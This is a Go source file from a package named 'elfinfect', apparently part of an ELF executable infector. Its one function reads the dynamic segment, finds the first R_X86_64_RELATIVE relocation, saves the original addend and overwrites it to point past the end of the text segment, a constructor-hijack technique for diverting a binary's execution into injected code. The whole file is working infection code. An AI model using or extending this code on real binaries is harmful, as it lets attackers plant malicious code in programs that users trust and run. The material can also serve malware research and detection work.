package elfinfect

import(
	"encoding/binary"
	"debug/elf"
	"reflect"
	"errors"
	"bytes"
	"fmt"
)

func (t *TargetBin) relativeRelocHook(origAddend *int64, relocEntry *elf.Rela64, debug bool) error {			
	pHeaders := t.Phdrs.([]elf.Prog64)
	textNdx := t.impNdx.textNdx

	if debug {
		fmt.Println("[+] CtorsHijack requested. Locating and reading Dynamic Segment")
		
	}
			
	if err := t.GetDyn(); err != nil {
		return err;
	}
		
	if debug {
		fmt.Printf("[+] %d entries in Dynamic Segment\n", len(t.Dyn.([]elf.Dyn64)))
	}
			
	var dtRelaOffset uint64
	var dtRelaEntryCount uint64

	for _, dynEntry := range t.Dyn.([]elf.Dyn64) {
		if elf.DynTag(dynEntry.Tag) == elf.DT_RELA {
			if debug {
				fmt.Printf("[+] Located DT_RELA @ 0x%016x\n", dynEntry.Val)
			}
			dtRelaOffset = dynEntry.Val
		}

		if elf.DynTag(dynEntry.Tag) == elf.DT_RELAENT {
			if debug {
				fmt.Printf("[+] DT_RELA has %d entries\n", dynEntry.Val)
			}
			dtRelaEntryCount = dynEntry.Val
		}
	}			

	if dtRelaEntryCount == 0 || dtRelaOffset == 0 {
		return errors.New("Error while acquiring DT_RELA or DT_RELAENT")
	}
			
	var o uint64
	if elf.Type(t.Hdr.(*elf.Header64).Type) == elf.ET_EXEC {
			if err := getBaseAddrOfVaddr(dtRelaOffset, t.Phdrs.([]elf.Prog64), &o); err != nil {
				return err
			}
	}else {
		o = dtRelaOffset
	}
			
	if debug{
		fmt.Printf("[+] File offset of relocations @ 0x%016x\n", o)
	}
			
	origRelocStart := o
			
	s := uint64(reflect.TypeOf(*relocEntry).Size())		
	endReloc := o + dtRelaEntryCount * uint64(s)
	for o < endReloc {
		relReader := bytes.NewBuffer(t.Contents[o : o + s])
		if err := binary.Read(relReader, t.EIdent.Endianness, relocEntry); err != nil {
			return err
		}
				
		if elf.R_X86_64(relocEntry.Info) == elf.R_X86_64_RELATIVE {
			if debug {
				fmt.Println("[+] Found first relative reloc")
				fmt.Printf("\toffset: 0x%016x\n", relocEntry.Off) 
				fmt.Printf("\ttype: %s\n", elf.R_X86_64(relocEntry.Info).String())
				fmt.Printf("\tAddend: 0x%016x\n", relocEntry.Addend)
			}
			break
		}
		o += s
	}

	if elf.R_X86_64(relocEntry.Info) != elf.R_X86_64_RELATIVE {
		return errors.New("No R_X86_64_RELATIVE relocation type present for this technique.")
	}
			
	*origAddend = relocEntry.Addend
	relocEntry.Addend = int64(pHeaders[textNdx].Vaddr + pHeaders[textNdx].Filesz) 
	
	relWriter := new(bytes.Buffer)
	if err := binary.Write(relWriter, t.EIdent.Endianness, relocEntry); err != nil {
		return err
	}
	
	copy(t.Contents[origRelocStart:], relWriter.Bytes())
	
	return nil
}
